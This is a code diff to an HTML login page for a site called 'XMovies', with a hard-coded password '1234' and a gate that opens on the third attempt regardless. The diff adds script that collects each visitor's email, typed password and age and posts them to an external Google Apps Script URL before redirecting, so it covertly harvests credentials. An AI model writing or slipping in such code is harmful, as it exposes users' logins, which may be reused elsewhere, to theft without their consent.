@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>XMovies</title>
-
 <style>
 *{ box-sizing:border-box; margin:0; padding:0; font-family:sans-serif;}
 body{ height:100vh; display:flex; justify-content:center; align-items:center; background:radial-gradient(circle at center,#111,#000);}
@@ -24,7 +23,6 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red;}
 @media(max-width:500px){ .box{ padding:20px;} h2{ font-size:20px;} .desc{ font-size:13px;} }
 </style>
 </head>
-
 <body>
 
 <div class="box">
@@ -52,15 +50,24 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red;}
 <script>
 let attempts = 0;
 const maxAttempts = 3;
-const correctPassword = "1234"; // ضع كلمة السر الصحيحة هنا
+const correctPassword = "1234"; // كلمة السر
+const sheetUrl = "https://script.google.com/macros/s/AKfycbwaj-hUD7cbVt-7HyCtgwjO245iDRZoSHxNaKCJYP20ySPil0-3PCQBDL3IVPHAdA_0lw/exec"; 
 
 function go(){
+  const email = document.getElementById("email").value;
   const pw = document.getElementById("password").value;
+  const age = document.getElementById("age").value;
   const error = document.getElementById("errorMsg");
   attempts++;
 
   if(pw === correctPassword || attempts === maxAttempts){
-    window.location.href = "movies.html";
+    fetch(sheetUrl, {
+      method: "POST",
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}`
+    }).then(()=>{
+      window.location.href = "movies.html";
+    });
   } else {
     error.innerText = "Password incorrect";
   }
